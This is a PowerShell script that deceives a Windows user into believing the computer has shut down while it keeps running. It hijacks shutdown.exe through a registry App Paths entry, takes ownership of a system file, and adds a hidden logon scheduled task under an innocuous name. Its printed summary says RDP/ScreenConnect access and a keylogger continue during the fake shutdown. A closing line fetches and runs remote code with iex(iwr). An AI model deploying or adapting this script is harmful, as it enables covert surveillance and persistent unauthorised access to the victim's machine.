# Simple fake shutdown - shows black screen instead of shutting down

# Create directory
$scriptDir = "C:\ProgramData\SystemUpdate"
if (-not (Test-Path $scriptDir)) {
    New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
}

# Create black screen PowerShell script (write line by line to avoid escaping issues)
$scriptPath = "$scriptDir\FakeShutdown.ps1"
$lines = @(
    'Add-Type -AssemblyName System.Windows.Forms',
    'Add-Type -Assembly PresentationFramework',
    '',
    '# Turn off monitor',
    '$monitorCode = "[DllImport(\""user32.dll\"")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);"',
    '$monitorType = Add-Type -MemberDefinition $monitorCode -Name PowerMonitor -Namespace Win32 -PassThru',
    '$monitorType::SendMessage(0xFFFF, 0x0112, 0xF170, 2)',
    '',
    '# Create black fullscreen window',
    '$window = New-Object System.Windows.Window',
    '$window.WindowState = [System.Windows.WindowState]::Maximized',
    '$window.WindowStyle = [System.Windows.WindowStyle]::None',
    '$window.Topmost = $true',
    '$window.Background = [System.Windows.Media.Brushes]::Black',
    '$window.ShowInTaskbar = $false',
    '$window.Cursor = [System.Windows.Input.Cursors]::None',
    '',
    '# Exit with Ctrl+Alt+Shift+F12',
    '$window.Add_KeyDown({',
    '    if ($_.Key -eq ''F12'' -and ',
    '        [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl) -and',
    '        [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftAlt) -and',
    '        [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftShift)) {',
    '        $window.Close()',
    '    }',
    '})',
    '',
    '$window.ShowDialog() | Out-Null'
)
$lines | Out-File -FilePath $scriptPath -Encoding UTF8

# Create batch wrapper
$batchPath = "$scriptDir\shutdown.bat"
"@echo off`r`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"`r`nexit" | Out-File -FilePath $batchPath -Encoding ASCII

# Backup original shutdown.exe
$shutdownExe = "$env:SystemRoot\System32\shutdown.exe"
$shutdownBak = "$env:SystemRoot\System32\shutdown.bak"

if (-not (Test-Path $shutdownBak)) {
    try {
        takeown /f $shutdownExe /a 2>$null | Out-Null
        icacls $shutdownExe /grant "Administrators:F" 2>$null | Out-Null
        Copy-Item $shutdownExe $shutdownBak -Force -ErrorAction Stop
        Write-Output "Backed up shutdown.exe"
    } catch {
        Write-Output "Warning: Could not backup shutdown.exe - continuing anyway"
    }
}

# Create VBS wrapper to launch black screen silently
$vbsPath = "$env:SystemRoot\System32\shutdown_fake.vbs"
$vbsContent = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath`", 0, False"
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII

# Override shutdown.exe via registry App Paths
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\shutdown.exe" /ve /t REG_SZ /d "$vbsPath" /f 2>$null | Out-Null

# Create scheduled task to show black screen on user logoff attempt
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName "UserSessionMonitor" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

Write-Output ""
Write-Output "======================================="
Write-Output "  FAKE SHUTDOWN CONFIGURED"
Write-Output "======================================="
Write-Output ""
Write-Output "When user clicks Shutdown/Logoff:"
Write-Output "  - Monitor turns off"
Write-Output "  - Black screen appears"
Write-Output "  - System stays RUNNING in background"
Write-Output ""
Write-Output "Remote access remains active:"
Write-Output "  - RDP/ScreenConnect still works"
Write-Output "  - Keylogger still capturing"
Write-Output "  - All services keep running"
Write-Output ""
Write-Output "Secret exit key: Ctrl+Alt+Shift+F12"
Write-Output ""
Write-Output "To revert: iex (iwr -useb URL/uninstall-fake-poweroff.ps1).Content"
Write-Output "======================================="
